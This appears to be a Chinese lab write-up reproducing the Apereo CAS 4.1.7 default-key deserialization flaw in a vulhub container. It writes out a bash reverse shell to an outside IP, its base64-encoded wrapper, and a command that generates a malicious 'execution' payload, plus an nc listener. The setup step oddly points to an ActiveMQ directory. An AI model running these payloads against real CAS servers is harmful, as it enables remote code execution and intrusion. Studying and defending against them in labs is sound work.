漏洞描述  
Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部点击登陆系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令

  

![](../Images/aac75e68f16f46b07169f32353b9fc35.png)  
漏洞原理  

4.1.7 之前 Apereo CAS使用了默认密钥changeit：

![](../Images/aac75e68f16f46b07169f32353b9fc35.png)  
影响版本  

 Apereo CAS <= 4.1.7

  

![](../Images/aac75e68f16f46b07169f32353b9fc35.png)  
漏洞复现  

开启靶机

`cd /vulhub/activemq/CVE-2015-5254`

`docker-compose up -d`

  

查看IP

`ifonfig`

  

查看端口

`docker ps`

![](../Images/4aab3fee70bb0aca33b11934f082ddc6.png)

  

访问web页面，发现是404

![](../Images/e1a3ce152abcd4d066a83fd5b45459e5.png)

访问http://your-ip:8080/cas/login查看登录页面

![](../Images/3a9e38e9fa7eb8774dcbfd41254a7146.png)

  

尝试登录，登不进，抓包发现有execution传参

![](../Images/9d8c407bcc9f07b85ae10b5b19bafd5c.png)

  

  

接着可以尝试使用Apereo-CAS-Attack生成加密execution

反弹shell命令编码：

bash -i >& /dev/tcp/192.168.198.132/7777 0>&1

  

经过base64加密：

YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5OC4xMzIvNzc3NyAwPiYx

  

构造Bash：

bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5OC4xMzIvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}

  

使用工具生成execution：

java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5OC4xMzIvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}"

  

![](../Images/be107f6ebc0e597afbbad4a1573047c2.png)

  

接着再登录一次，抓包将Body中的execution值替换成上面生成的Payload发送：

![](../Images/602684f7b4801d31a6b210c6643cfc98.png)

  

最后设置监听，就可以了

`nc -lvp 7777`

![](../Images/bc1c55d3a54e7a1f84a97ddb7a939678.png)

  

### 删除靶机

`docker-compose down -v`
